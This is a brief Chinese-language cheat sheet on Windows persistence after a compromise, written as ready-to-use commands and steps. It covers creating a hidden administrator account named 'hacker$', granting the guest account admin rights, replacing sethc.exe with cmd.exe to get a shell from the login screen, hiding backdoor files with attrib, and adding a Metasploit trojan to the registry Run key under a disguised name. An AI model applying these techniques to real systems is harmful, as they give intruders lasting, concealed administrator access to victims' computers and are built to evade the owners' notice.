## Windows权限维持

#### 1、创建隐藏用户

使用命令创建用户时，通过在用户名后加 $ 来创建一个隐藏账户。

```shell
net user hacker$ password /add		# 创建隐藏账户hacker$
net localgroup administrators hacker$ /add		# 将该用户添加至管理员组%
```

#### 2、启用来宾用户（guest）

```shell
net user guest password 
net localgroup administrators guest /add    # 将guest用户移动至管理员组
net user guest /active:yes                   # 启用guest用户
```

#### 3、Shift 后门

```shell
1、修改c:\windows\system32的目录权限，若无法修改，可以尝试将该目录拥有者修改为administrator，而后再进行修改。

2、将复制好的cmd.exe改名后替换掉c:\windows\system32下原始的sethc.exe。

3、在登录页面，连按五次shift即可弹出cmd命令窗口。

4、放大镜magnify.exe同理
```

#### 4、隐藏属性后门文件

Windows下隐藏文件，除了设置为隐藏属性外，还可以使用 attrib 命令设置文件为 系统文件。这样单独显示隐藏文件是看不到的。必须要显示系统文件才能看到。

```shell
attrib +H +S 文件名
```

#### 5、注册表开机自动启动项

```shell
# 1、利用msf生成一个木马shell.exe文件，详细过程不赘述了

# 2、利用msf开启监听

# 3、将木马上传到目标主机

# 4、打开注册表，找到HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run子键，而后右键->新建->字符串值。填入数值名称，和数值数据内容为木马程序所在路径+”-autorun”

# 5、可以将数值名称和木马名称修改为常用的软件，混淆视听
```






